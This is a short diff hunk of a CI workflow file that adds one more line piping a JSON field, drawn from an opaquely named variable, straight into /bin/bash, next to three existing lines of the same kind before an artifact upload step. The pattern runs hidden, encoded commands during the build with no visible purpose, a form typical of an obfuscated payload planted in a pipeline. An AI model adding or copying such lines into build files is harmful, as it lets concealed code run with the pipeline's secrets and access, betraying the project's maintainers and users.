@@ -30,6 +30,7 @@ jobs:
           echo $mmp00346 | jq -r .y30 | /bin/bash
           echo $qetd3 | jq -r .qepjo431 | /bin/bash
           printf '%s' "$v0" | jq -r .cv81 | /bin/bash
+          printf '%s' "$ebkzk52" | jq -r .col63713 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
